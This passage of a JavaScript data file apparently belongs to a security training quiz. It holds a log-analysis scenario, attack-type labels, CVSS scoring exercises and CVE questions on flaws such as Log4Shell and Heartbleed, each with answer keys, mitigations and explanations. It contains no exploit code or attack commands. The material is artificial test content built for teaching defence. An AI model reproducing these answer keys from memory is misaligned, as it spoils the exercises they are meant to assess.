        explanation: "This shows a password spraying attack. Key indicators: (1) Many different usernames tried, (2) One attempt per user (then moves on), (3) Same source IP, (4) 30-minute gap before retrying users (avoiding lockout), (5) All failures are 'Bad Password'. Unlike brute force, password spraying tries one password across many accounts to avoid lockout policies.",
        indicators: ["Many usernames, few attempts each", "Timing gaps to avoid lockout", "Same password pattern", "Single source IP", "Event 4625 pattern"]
    }
];

// Event type options for log analysis
const eventTypes = [
    { id: "brute_force", label: "Brute Force Attack" },
    { id: "sql_injection", label: "SQL Injection" },
    { id: "port_scanning", label: "Port Scanning" },
    { id: "privilege_escalation", label: "Privilege Escalation" },
    { id: "data_exfiltration", label: "Data Exfiltration" },
    { id: "path_traversal", label: "Path/Directory Traversal" },
    { id: "xss", label: "Cross-Site Scripting (XSS)" },
    { id: "command_injection", label: "Command Injection" },
    { id: "ransomware", label: "Ransomware Activity" },
    { id: "webshell", label: "Web Shell Attack" },
    { id: "credential_stuffing", label: "Credential Stuffing" },
    { id: "dns_tunneling", label: "DNS Tunneling" },
    { id: "ddos", label: "DDoS Attack" },
    { id: "lateral_movement", label: "Lateral Movement" },
    { id: "xxe", label: "XML External Entity (XXE)" },
    { id: "insider_threat", label: "Insider Threat/Anomaly" },
    { id: "ssrf", label: "Server-Side Request Forgery (SSRF)" },
    { id: "cryptomining", label: "Cryptominer/Cryptojacking" },
    { id: "kerberoasting", label: "Kerberoasting" },
    { id: "vulnerability_scanning", label: "Vulnerability Scanning" },
    { id: "buffer_overflow", label: "Buffer Overflow" },
    { id: "lolbin_abuse", label: "LOLBin Abuse" },
    { id: "c2_beaconing", label: "C2 Beaconing" },
    { id: "password_spraying", label: "Password Spraying" }
];

// CVSS Scenarios for practice
const cvssScenarios = [
    {
        id: 1,
        description: "A vulnerability in a web application allows an unauthenticated remote attacker to execute arbitrary SQL commands by manipulating user input in the login form. This allows complete database access including reading all user credentials and modifying data.",
        version: "3.1",
        correctMetrics: { AV: "N", AC: "L", PR: "N", UI: "N", S: "U", C: "H", I: "H", A: "N" },
        correctScore: 9.1,
        severity: "Critical",
        explanation: {
            AV: "Network - The vulnerability can be exploited remotely over the internet",
            AC: "Low - No special conditions required, just send malicious input",
            PR: "None - No authentication needed to exploit",
            UI: "None - No user interaction required",
            S: "Unchanged - Impact limited to the vulnerable database component",
            C: "High - Full access to all database contents including credentials",
            I: "High - Attacker can modify or delete any data in the database",
            A: "None - The attack doesn't affect availability of the system"
        }
    },
    {
        id: 2,
        description: "A buffer overflow in a PDF reader application allows remote code execution when a user opens a specially crafted PDF file. The attacker can execute code with the privileges of the current user.",
        version: "3.1",
        correctMetrics: { AV: "L", AC: "L", PR: "N", UI: "R", S: "U", C: "H", I: "H", A: "H" },
        correctScore: 7.8,
        severity: "High",
        explanation: {
            AV: "Local - Requires the malicious file to be on the local system",
            AC: "Low - Reliable exploitation, just open the file",
            PR: "None - Any user can open the malicious PDF",
            UI: "Required - User must open the malicious PDF file",
            S: "Unchanged - Code runs with user's existing privileges",
            C: "High - Full access to user's data and system",
            I: "High - Can modify any files the user has access to",
            A: "High - Can crash the application or system"
        }
    },
    {
        id: 3,
        description: "A vulnerability in a network router's web interface allows an authenticated administrator to inject commands into configuration fields, which are executed as root on the underlying operating system.",
        version: "3.1",
        correctMetrics: { AV: "N", AC: "L", PR: "H", UI: "N", S: "C", C: "H", I: "H", A: "H" },
        correctScore: 9.1,
        severity: "Critical",
        explanation: {
            AV: "Network - Web interface accessible over the network",
            AC: "Low - Simple command injection, no special conditions",
            PR: "High - Requires administrator privileges",
            UI: "None - No additional user interaction needed",
            S: "Changed - Escapes from web app to OS level (different security context)",
            C: "High - Root access means complete confidentiality compromise",
            I: "High - Root access allows any modification",
            A: "High - Can shutdown or disable the router completely"
        }
    },
    {
        id: 4,
        description: "An information disclosure vulnerability in a web application reveals stack traces and internal paths in error messages when exceptions occur. No authentication is required to trigger these errors.",
        version: "3.1",
        correctMetrics: { AV: "N", AC: "L", PR: "N", UI: "N", S: "U", C: "L", I: "N", A: "N" },
        correctScore: 5.3,
        severity: "Medium",
        explanation: {
            AV: "Network - Accessible over the internet",
            AC: "Low - Easy to trigger error conditions",
            PR: "None - No authentication required",
            UI: "None - Automatic in error conditions",
            S: "Unchanged - Only affects the web application",
            C: "Low - Limited information disclosure (paths, versions)",
            I: "None - No modification possible",
            A: "None - Does not affect availability"
        }
    },
    {
        id: 5,
        description: "A race condition in a multi-threaded application allows local users to escalate privileges by exploiting a time-of-check-time-of-use (TOCTOU) vulnerability in file permission checks. Exploitation requires precise timing and multiple attempts.",
        version: "3.1",
        correctMetrics: { AV: "L", AC: "H", PR: "L", UI: "N", S: "U", C: "H", I: "H", A: "H" },
        correctScore: 7.0,
        severity: "High",
        explanation: {
            AV: "Local - Must have local system access",
            AC: "High - Race condition requires precise timing",
            PR: "Low - Requires basic user account",
            UI: "None - Automated exploitation once conditions met",
            S: "Unchanged - Privilege escalation within same system",
            C: "High - Can access privileged data",
            I: "High - Can modify privileged resources",
            A: "High - Can affect system stability"
        }
    },
    {
        id: 6,
        description: "A cross-site scripting (XSS) vulnerability in a banking application allows attackers to inject malicious JavaScript that executes in victims' browsers when they view their account statements. This can steal session tokens.",
        version: "3.1",
        correctMetrics: { AV: "N", AC: "L", PR: "L", UI: "R", S: "C", C: "L", I: "L", A: "N" },
        correctScore: 5.4,
        severity: "Medium",
        explanation: {
            AV: "Network - Attack delivered over the web",
            AC: "Low - Straightforward XSS injection",
            PR: "Low - Need account to inject content",
            UI: "Required - Victim must view the malicious content",
            S: "Changed - Script runs in victim's browser (different context)",
            C: "Low - Can steal session tokens but not full database",
            I: "Low - Can modify displayed content in victim's session",
            A: "None - Does not affect availability"
        }
    },
    {
        id: 7,
        description: "A denial of service vulnerability in an email server allows unauthenticated attackers to crash the service by sending malformed SMTP commands, requiring manual restart to recover.",
        version: "3.1",
        correctMetrics: { AV: "N", AC: "L", PR: "N", UI: "N", S: "U", C: "N", I: "N", A: "H" },
        correctScore: 7.5,
        severity: "High",
        explanation: {
            AV: "Network - SMTP accessible over network",
            AC: "Low - Simple malformed command",
            PR: "None - No authentication needed",
            UI: "None - Automatic crash",
            S: "Unchanged - Only email service affected",
            C: "None - No data disclosure",
            I: "None - No data modification",
            A: "High - Complete service outage"
        }
    },
    {
        id: 8,
        description: "A vulnerability in Bluetooth implementation allows an attacker within radio range to execute arbitrary code on the target device without any user interaction or authentication.",
        version: "3.1",
        correctMetrics: { AV: "A", AC: "L", PR: "N", UI: "N", S: "U", C: "H", I: "H", A: "H" },
        correctScore: 8.8,
        severity: "High",
        explanation: {
            AV: "Adjacent - Requires Bluetooth proximity (radio range)",
            AC: "Low - Reliable exploitation",
            PR: "None - No authentication required",
            UI: "None - No user interaction needed",
            S: "Unchanged - Affects the vulnerable device only",
            C: "High - Full device compromise",
            I: "High - Can modify any data",
            A: "High - Can disable device"
        }
    },
    {
        id: 9,
        description: "A vulnerability in a VPN client requires physical access to the device. An attacker with physical access can extract stored VPN credentials from an unencrypted configuration file.",
        version: "3.1",
        correctMetrics: { AV: "P", AC: "L", PR: "N", UI: "N", S: "U", C: "H", I: "N", A: "N" },
        correctScore: 4.6,
        severity: "Medium",
        explanation: {
            AV: "Physical - Must have physical device access",
            AC: "Low - Credentials stored in clear text",
            PR: "None - No system authentication needed",
            UI: "None - Direct file access",
            S: "Unchanged - Only VPN credentials affected",
            C: "High - Full VPN credential disclosure",
            I: "None - Cannot modify VPN configuration",
            A: "None - Does not affect availability"
        }
    },
    {
        id: 10,
        description: "A container escape vulnerability allows processes running inside a Docker container to break out and execute code on the host system with root privileges. Exploitation requires the attacker to already have code execution inside the container.",
        version: "3.1",
        correctMetrics: { AV: "L", AC: "L", PR: "L", UI: "N", S: "C", C: "H", I: "H", A: "H" },
        correctScore: 8.8,
        severity: "High",
        explanation: {
            AV: "Local - Requires access inside the container",
            AC: "Low - Reliable escape technique",
            PR: "Low - Needs code execution in container",
            UI: "None - Automated exploitation",
            S: "Changed - Escapes container to host (different security context)",
            C: "High - Full host access",
            I: "High - Can modify host system",
            A: "High - Can affect all containers and host"
        }
    },
    {
        id: 11,
        description: "A memory corruption vulnerability in a video conferencing application allows remote code execution when processing a specially crafted video stream during a call. No user action beyond joining the call is required.",
        version: "3.1",
        correctMetrics: { AV: "N", AC: "L", PR: "N", UI: "N", S: "U", C: "H", I: "H", A: "H" },
        correctScore: 9.8,
        severity: "Critical",
        explanation: {
            AV: "Network - Video stream delivered over network",
            AC: "Low - Malicious stream triggers reliably",
            PR: "None - Any participant can send video",
            UI: "None - Automatic when receiving stream",
            S: "Unchanged - Affects the victim's system",
            C: "High - Code execution with app privileges",
            I: "High - Full system modification possible",
            A: "High - Can crash or disable system"
        }
    },
    {
        id: 12,
        description: "An SSRF vulnerability in a cloud application allows authenticated users to make HTTP requests from the server to internal services, potentially accessing cloud metadata endpoints and service credentials.",
        version: "3.1",
        correctMetrics: { AV: "N", AC: "L", PR: "L", UI: "N", S: "C", C: "H", I: "L", A: "N" },
        correctScore: 8.5,
        severity: "High",
        explanation: {
            AV: "Network - Web application accessible remotely",
            AC: "Low - Simple URL manipulation",
            PR: "Low - Requires authenticated user account",
            UI: "None - Direct exploitation",
            S: "Changed - Affects internal services beyond the web app",
            C: "High - Can access cloud credentials and internal data",
            I: "Low - Limited ability to modify internal services",
            A: "None - Does not directly cause outage"
        }
    },
    {
        id: 13,
        description: "A path traversal vulnerability in a backup application allows authenticated administrators to read any file on the system by manipulating the backup file path parameter.",
        version: "3.1",
        correctMetrics: { AV: "N", AC: "L", PR: "H", UI: "N", S: "U", C: "H", I: "N", A: "N" },
        correctScore: 4.9,
        severity: "Medium",
        explanation: {
            AV: "Network - Backup application accessible remotely",
            AC: "Low - Simple path manipulation",
            PR: "High - Requires administrator account",
            UI: "None - Direct exploitation",
            S: "Unchanged - Limited to backup server",
            C: "High - Can read any file including sensitive configs",
            I: "None - Cannot modify files",
            A: "None - Does not affect availability"
        }
    },
    {
        id: 14,
        description: "A use-after-free vulnerability in a browser's JavaScript engine allows remote code execution when visiting a malicious website. The exploit is reliable and works against the latest version.",
        version: "3.1",
        correctMetrics: { AV: "N", AC: "L", PR: "N", UI: "R", S: "C", C: "H", I: "H", A: "H" },
        correctScore: 9.6,
        severity: "Critical",
        explanation: {
            AV: "Network - Exploited via visiting a webpage",
            AC: "Low - Reliable exploit",
            PR: "None - No privileges needed",
            UI: "Required - User must visit the page",
            S: "Changed - Can escape browser sandbox",
            C: "High - Full system access possible",
            I: "High - Can install malware",
            A: "High - Can render system unusable"
        }
    },
    {
        id: 15,
        description: "A hardcoded credential in an IoT device firmware allows anyone on the same network to gain administrative access to the device's management interface using default credentials that cannot be changed.",
        version: "3.1",
        correctMetrics: { AV: "A", AC: "L", PR: "N", UI: "N", S: "U", C: "H", I: "H", A: "H" },
        correctScore: 8.8,
        severity: "High",
        explanation: {
            AV: "Adjacent - Must be on same network as device",
            AC: "Low - Just use the known credentials",
            PR: "None - No prior access needed",
            UI: "None - Direct login",
            S: "Unchanged - Affects only the IoT device",
            C: "High - Full admin access to device",
            I: "High - Can reconfigure device",
            A: "High - Can disable device functionality"
        }
    }
];

// CVE Scenarios for practice
const cveScenarios = [
    {
        id: 1,
        cveId: "CVE-2021-44228",
        name: "Log4Shell",
        published: "December 10, 2021",
        cvssScore: 10.0,
        severity: "Critical",
        category: "application",
        difficulty: "intermediate",
        description: "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.",
        affectedProducts: "Apache Log4j 2.0-beta9 to 2.14.1",
        vulnType: "rce",
        attackVector: "network",
        correctMitigation: "upgrade",
        mitigationExplanation: "The primary mitigation is to upgrade Log4j to version 2.17.0 or later. For systems that cannot be immediately upgraded, disable message lookup substitution by setting log4j2.formatMsgNoLookups=true or remove the JndiLookup class from the classpath.",
        questions: {
            vulnType: {
                correct: "rce",
                options: ["rce", "xss", "sqli", "dos"],
                explanation: "This is a Remote Code Execution (RCE) vulnerability. The JNDI lookup feature allows attackers to load and execute arbitrary code from remote servers."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - The vulnerability can be exploited remotely by anyone who can cause a malicious string to be logged by Log4j, including via web requests, headers, or any input that gets logged."
            },
            mitigation: {
                correct: "upgrade",
                options: ["upgrade", "firewall", "antivirus", "encryption"],
                explanation: "Upgrade to a patched version of Log4j (2.17.0+). Temporary mitigations include setting formatMsgNoLookups=true, but upgrading is the only complete fix."
            }
        }
    },
    {
        id: 2,
        cveId: "CVE-2017-0144",
        name: "EternalBlue",
        published: "March 14, 2017",
        cvssScore: 8.1,
        severity: "High",
        category: "network",
        difficulty: "intermediate",
        description: "The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka 'Windows SMB Remote Code Execution Vulnerability.'",
        affectedProducts: "Windows Vista through Windows 10, Windows Server 2008 through 2016",
        vulnType: "rce",
        attackVector: "network",
        correctMitigation: "patch",
        mitigationExplanation: "Apply Microsoft security patch MS17-010. Additionally, disable SMBv1 if not required, block port 445 at network perimeter, and ensure proper network segmentation.",
        questions: {
            vulnType: {
                correct: "rce",
                options: ["rce", "info_disclosure", "privilege_escalation", "dos"],
                explanation: "This is a Remote Code Execution vulnerability in SMBv1. It was famously used by WannaCry and NotPetya ransomware for lateral movement."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - SMB port 445 is accessible over the network, allowing remote exploitation without authentication."
            },
            mitigation: {
                correct: "patch",
                options: ["patch", "vpn", "password_change", "mfa"],
                explanation: "Apply the MS17-010 security patch from Microsoft. Disable SMBv1 entirely if possible, as it's deprecated and has multiple security issues."
            }
        }
    },
    {
        id: 3,
        cveId: "CVE-2019-0708",
        name: "BlueKeep",
        published: "May 14, 2019",
        cvssScore: 9.8,
        severity: "Critical",
        category: "network",
        difficulty: "advanced",
        description: "A remote code execution vulnerability exists in Remote Desktop Services formerly known as Terminal Services when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests, aka 'Remote Desktop Services Remote Code Execution Vulnerability'.",
        affectedProducts: "Windows XP, Windows 7, Windows Server 2003, 2008, 2008 R2",
        vulnType: "rce",
        attackVector: "network",
        correctMitigation: "patch",
        mitigationExplanation: "Apply Microsoft security patches immediately. If patching isn't possible, enable Network Level Authentication (NLA), block port 3389 externally, or disable Remote Desktop Services entirely.",
        questions: {
            vulnType: {
                correct: "rce",
                options: ["rce", "buffer_overflow", "authentication_bypass", "dos"],
                explanation: "This is a pre-authentication Remote Code Execution vulnerability in RDP. It's wormable, meaning it can spread automatically between vulnerable systems."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - RDP (port 3389) is a network service. The vulnerability requires no authentication, making it extremely dangerous if RDP is exposed."
            },
            mitigation: {
                correct: "patch",
                options: ["patch", "disable_rdp", "antivirus", "backup"],
                explanation: "Patch is the primary mitigation. Enable NLA as defense-in-depth. Block RDP at the perimeter and use VPN for remote access instead."
            }
        }
    },
    {
        id: 4,
        cveId: "CVE-2014-0160",
        name: "Heartbleed",
        published: "April 7, 2014",
        cvssScore: 7.5,
        severity: "High",
        category: "network",
        difficulty: "beginner",
        description: "The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys.",
        affectedProducts: "OpenSSL 1.0.1 through 1.0.1f",
        vulnType: "info_disclosure",
        attackVector: "network",
        correctMitigation: "upgrade",
        mitigationExplanation: "Upgrade OpenSSL to version 1.0.1g or later. After patching, regenerate all SSL certificates and private keys, revoke old certificates, and force users to change passwords as session data may have been compromised.",
        questions: {
            vulnType: {
                correct: "info_disclosure",
                options: ["info_disclosure", "rce", "dos", "sqli"],
                explanation: "This is an Information Disclosure vulnerability. It allows reading up to 64KB of server memory per request, potentially exposing private keys, passwords, and session tokens."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - The vulnerability is in the TLS heartbeat protocol, exploitable by any client connecting over HTTPS or other TLS-protected services."
            },
            mitigation: {
                correct: "upgrade",
                options: ["upgrade", "firewall", "reboot", "antivirus"],
                explanation: "Upgrade OpenSSL immediately. Regenerate SSL certificates and private keys after patching, as they may have been compromised."
            }
        }
    },
    {
        id: 5,
        cveId: "CVE-2021-34527",
        name: "PrintNightmare",
        published: "July 1, 2021",
        cvssScore: 8.8,
        severity: "High",
        category: "os",
        difficulty: "intermediate",
        description: "Windows Print Spooler Remote Code Execution Vulnerability. A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges.",
        affectedProducts: "All Windows versions with Print Spooler enabled",
        vulnType: "rce",
        attackVector: "network",
        correctMitigation: "patch",
        mitigationExplanation: "Apply Microsoft security patches. For immediate mitigation, disable the Print Spooler service on systems that don't need it (especially Domain Controllers). Restrict Point and Print functionality via Group Policy.",
        questions: {
            vulnType: {
                correct: "rce",
                options: ["rce", "privilege_escalation", "info_disclosure", "dos"],
                explanation: "This is an RCE vulnerability allowing SYSTEM-level code execution via the Print Spooler service. It can also be used for local privilege escalation."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - The Print Spooler RPC interface is accessible over the network, allowing remote exploitation with valid domain credentials."
            },
            mitigation: {
                correct: "patch",
                options: ["patch", "disable_service", "antivirus", "encryption"],
                explanation: "Apply Microsoft patches. Disable Print Spooler on servers that don't need printing, especially Domain Controllers where this is most dangerous."
            }
        }
    },
    {
        id: 6,
        cveId: "CVE-2020-1472",
        name: "Zerologon",
        published: "August 11, 2020",
        cvssScore: 10.0,
        severity: "Critical",
        category: "os",
        difficulty: "advanced",
        description: "An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller. An attacker who successfully exploited the vulnerability could run a specially crafted application on a device on the network that would reset the Domain Controller's computer account password.",
        affectedProducts: "Windows Server 2008 through 2019, all Domain Controllers",
        vulnType: "privilege_escalation",
        attackVector: "network",
        correctMitigation: "patch",
        mitigationExplanation: "Apply Microsoft security patches immediately. Enable enforcement mode for secure Netlogon. Monitor for Event ID 5829 which indicates vulnerable connections. After patching, rotate the DC machine account password.",
        questions: {
            vulnType: {
                correct: "privilege_escalation",
                options: ["privilege_escalation", "rce", "info_disclosure", "authentication_bypass"],
                explanation: "This is a Privilege Escalation vulnerability that allows taking over a Domain Controller by resetting its machine account password, effectively granting domain admin access."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - Exploitable from any system on the network that can reach the Domain Controller's Netlogon RPC interface (no authentication required)."
            },
            mitigation: {
                correct: "patch",
                options: ["patch", "network_segmentation", "mfa", "password_policy"],
                explanation: "Patch immediately with Microsoft updates. Enable Netlogon enforcement mode and monitor for exploitation attempts via Windows Event logs."
            }
        }
    },
    {
        id: 7,
        cveId: "CVE-2019-11510",
        name: "Pulse Secure VPN Arbitrary File Read",
        published: "April 24, 2019",
        cvssScore: 10.0,
        severity: "Critical",
        category: "network",
        difficulty: "intermediate",
        description: "In Pulse Secure Pulse Connect Secure (PCS) 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4, an unauthenticated remote attacker can send a specially crafted URI to perform an arbitrary file reading vulnerability.",
        affectedProducts: "Pulse Connect Secure VPN 8.2.x, 8.3.x, 9.0.x",
        vulnType: "path_traversal",
        attackVector: "network",
        correctMitigation: "upgrade",
        mitigationExplanation: "Upgrade to patched Pulse Secure versions immediately. After patching, rotate all credentials stored on the VPN appliance as session files may have been read. Enable multi-factor authentication and monitor for unauthorized access.",
        questions: {
            vulnType: {
                correct: "path_traversal",
                options: ["path_traversal", "rce", "sqli", "xss"],
                explanation: "This is a Path Traversal (arbitrary file read) vulnerability allowing unauthenticated access to sensitive files including user session tokens and cached credentials."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - The VPN web interface is exposed to the internet, making this exploitable by anyone worldwide without authentication."
            },
            mitigation: {
                correct: "upgrade",
                options: ["upgrade", "vpn_disable", "password_change", "firewall"],
                explanation: "Upgrade immediately. Rotate all credentials after patching as cached passwords may have been stolen. Implement MFA to prevent use of stolen credentials."
            }
        }
    },
    {
        id: 8,
        cveId: "CVE-2021-26855",
        name: "ProxyLogon",
        published: "March 2, 2021",
        cvssScore: 9.8,
        severity: "Critical",
        category: "application",
        difficulty: "advanced",
        description: "Microsoft Exchange Server Remote Code Execution Vulnerability. This CVE is part of a chain of vulnerabilities (ProxyLogon) allowing unauthenticated attackers to gain access to Exchange servers and potentially exfiltrate mailbox contents.",
        affectedProducts: "Microsoft Exchange Server 2013, 2016, 2019",
        vulnType: "rce",
        attackVector: "network",
        correctMitigation: "patch",
        mitigationExplanation: "Apply Microsoft security patches immediately. Investigate for signs of compromise using Microsoft's detection tools. If compromised, assume full network breach and conduct thorough incident response including credential rotation.",
        questions: {
            vulnType: {
                correct: "rce",
                options: ["rce", "ssrf", "authentication_bypass", "info_disclosure"],
                explanation: "ProxyLogon is a chain leading to RCE. CVE-2021-26855 is an SSRF, but the complete chain allows full server compromise and code execution."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - Exchange OWA is typically internet-facing, making this exploitable by any attacker worldwide without credentials."
            },
            mitigation: {
                correct: "patch",
                options: ["patch", "offline_server", "antivirus", "encryption"],
                explanation: "Patch Exchange servers immediately. Check for web shells and signs of compromise. This was actively exploited in the wild before patches were available."
            }
        }
    },
    {
        id: 9,
        cveId: "CVE-2023-23397",
        name: "Outlook Privilege Escalation",
        published: "March 14, 2023",
        cvssScore: 9.8,
        severity: "Critical",
        category: "application",
        difficulty: "beginner",
        description: "Microsoft Outlook Elevation of Privilege Vulnerability. An attacker who successfully exploited this vulnerability could access a user's Net-NTLMv2 hash which could be used to authenticate as the user.",
        affectedProducts: "Microsoft Outlook for Windows",
        vulnType: "privilege_escalation",
        attackVector: "network",
        correctMitigation: "patch",
        mitigationExplanation: "Apply Microsoft patches. Block outbound SMB (port 445) at firewall. Add users to Protected Users security group. Enable Extended Protection for Authentication on Exchange.",
        questions: {
            vulnType: {
                correct: "privilege_escalation",
                options: ["privilege_escalation", "rce", "phishing", "dos"],
                explanation: "This is a Privilege Escalation vulnerability. Attackers can steal NTLM hashes via a specially crafted email that triggers when Outlook retrieves and processes it - no user interaction required."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - The attack is delivered via email and triggers automatically when the message is received, causing Outlook to connect to an attacker-controlled SMB server."
            },
            mitigation: {
                correct: "patch",
                options: ["patch", "email_filter", "antivirus", "backup"],
                explanation: "Apply Microsoft patches. Block outbound SMB at network perimeter. This attack requires no user interaction - just receiving the email is enough."
            }
        }
    },
    {
        id: 10,
        cveId: "CVE-2018-11776",
        name: "Apache Struts RCE",
        published: "August 22, 2018",
        cvssScore: 9.8,
        severity: "Critical",
        category: "web",
        difficulty: "intermediate",
        description: "Apache Struts versions 2.3 to 2.3.34 and 2.5 to 2.5.16 are vulnerable to a Remote Code Execution vulnerability when using results with no namespace and actions configurations have no or a wildcard namespace.",
        affectedProducts: "Apache Struts 2.3 to 2.3.34, 2.5 to 2.5.16",
        vulnType: "rce",
        attackVector: "network",
        correctMitigation: "upgrade",
        mitigationExplanation: "Upgrade to Apache Struts 2.3.35 or 2.5.17 or later. If upgrade isn't immediately possible, ensure all results have namespace set, and all actions have namespace defined or use wildcard namespace with strict matching.",
        questions: {
            vulnType: {
                correct: "rce",
                options: ["rce", "sqli", "xss", "xxe"],
                explanation: "This is a Remote Code Execution vulnerability caused by OGNL injection when namespace is not properly configured, allowing arbitrary command execution."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - Struts is a web framework; the vulnerability is exploited via HTTP requests to the vulnerable application."
            },
            mitigation: {
                correct: "upgrade",
                options: ["upgrade", "waf", "disable_feature", "input_validation"],
                explanation: "Upgrade Struts immediately. Ensure all actions and results have proper namespace configuration. Consider WAF rules as temporary mitigation."
            }
        }
    },
    {
        id: 11,
        cveId: "CVE-2017-5638",
        name: "Apache Struts Jakarta Multipart Parser RCE",
        published: "March 6, 2017",
        cvssScore: 10.0,
        severity: "Critical",
        category: "web",
        difficulty: "beginner",
        description: "The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling that allows remote attackers to execute arbitrary commands via a crafted Content-Type header.",
        affectedProducts: "Apache Struts 2.3.x before 2.3.32, 2.5.x before 2.5.10.1",
        vulnType: "rce",
        attackVector: "network",
        correctMitigation: "upgrade",
        mitigationExplanation: "Upgrade to Struts 2.3.32 or 2.5.10.1 or later. This was the vulnerability exploited in the Equifax breach. WAF rules can provide temporary mitigation by blocking malicious Content-Type headers.",
        questions: {
            vulnType: {
                correct: "rce",
                options: ["rce", "dos", "path_traversal", "info_disclosure"],
                explanation: "This is an RCE vulnerability. Malicious OGNL expressions in the Content-Type header are evaluated, allowing arbitrary command execution. Famously used in the Equifax breach."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - Exploited via a malicious HTTP Content-Type header in any request to the Struts application."
            },
            mitigation: {
                correct: "upgrade",
                options: ["upgrade", "content_filter", "antivirus", "ssl"],
                explanation: "Upgrade Struts immediately. Switch to a different multipart parser as temporary workaround. Implement WAF rules to block malicious Content-Type patterns."
            }
        }
    },
    {
        id: 12,
        cveId: "CVE-2022-22965",
        name: "Spring4Shell",
        published: "March 31, 2022",
        cvssScore: 9.8,
        severity: "Critical",
        category: "web",
        difficulty: "advanced",
        description: "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment.",
        affectedProducts: "Spring Framework 5.3.0 to 5.3.17, 5.2.0 to 5.2.19",
        vulnType: "rce",
        attackVector: "network",
        correctMitigation: "upgrade",
        mitigationExplanation: "Upgrade Spring Framework to 5.3.18+ or 5.2.20+. Upgrade to Tomcat 10.0.20+, 9.0.62+, or 8.5.78+. Alternatively, downgrade to Java 8 as temporary workaround (not recommended long-term).",
        questions: {
            vulnType: {
                correct: "rce",
                options: ["rce", "sqli", "deserialization", "ssrf"],
                explanation: "This is an RCE vulnerability via data binding that allows attackers to write malicious JSP files to the webserver, achieving code execution."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - Exploitable via HTTP requests to Spring applications running on Tomcat with JDK 9+."
            },
            mitigation: {
                correct: "upgrade",
                options: ["upgrade", "waf", "java_downgrade", "disable_binding"],
                explanation: "Upgrade Spring Framework and Tomcat. The vulnerability requires specific conditions (JDK 9+, Tomcat, WAR deployment) but affects many enterprise applications."
            }
        }
    },
    {
        id: 13,
        cveId: "CVE-2021-21972",
        name: "VMware vCenter Server RCE",
        published: "February 23, 2021",
        cvssScore: 9.8,
        severity: "Critical",
        category: "application",
        difficulty: "advanced",
        description: "The vSphere Client (HTML5) contains a remote code execution vulnerability in a vCenter Server plugin. A malicious actor with network access to port 443 may exploit this issue to execute commands with unrestricted privileges on the underlying operating system.",
        affectedProducts: "VMware vCenter Server 6.5, 6.7, 7.0",
        vulnType: "rce",
        attackVector: "network",
        correctMitigation: "patch",
        mitigationExplanation: "Apply VMware patches immediately. As temporary workaround, disable the vulnerable plugin or restrict access to vCenter to trusted networks only. Never expose vCenter directly to the internet.",
        questions: {
            vulnType: {
                correct: "rce",
                options: ["rce", "privilege_escalation", "authentication_bypass", "xxe"],
                explanation: "This is an RCE vulnerability allowing unauthenticated attackers to execute OS commands on the vCenter server with maximum privileges."
            },
            attackVector: {
                correct: "network",
                options: ["network", "local", "physical", "adjacent"],
                explanation: "Network - vCenter is typically accessible over the network on port 443. The vulnerability requires no authentication."
            },
            mitigation: {
                correct: "patch",
                options: ["patch", "network_restriction", "antivirus", "mfa"],
                explanation: "Apply VMware patches. Restrict vCenter access to management networks. Never expose vCenter Server directly to the internet."
            }
        }
    },
    {
        id: 14,
        cveId: "CVE-2020-14882",
        name: "Oracle WebLogic RCE",
        published: "October 20, 2020",
        cvssScore: 9.8,
        severity: "Critical",
        category: "application",
        difficulty: "intermediate",
        description: "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server.",
        affectedProducts: "Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0",
        vulnType: "rce",
        attackVector: "network",
        correctMitigation: "patch",
        mitigationExplanation: "Apply Oracle's Critical Patch Update. Restrict access to WebLogic administration console. Do not expose WebLogic console to the internet. Implement network segmentation.",
        questions: {
            vulnType: {
                correct: "rce",
                options: ["rce", "dos", "info_disclosure", "xss"],
                explanation: "This is an RCE vulnerability that allows unauthenticated remote code execution via a simple HTTP request to the WebLogic console."
            },
            attackVector: {
                correct: "network",
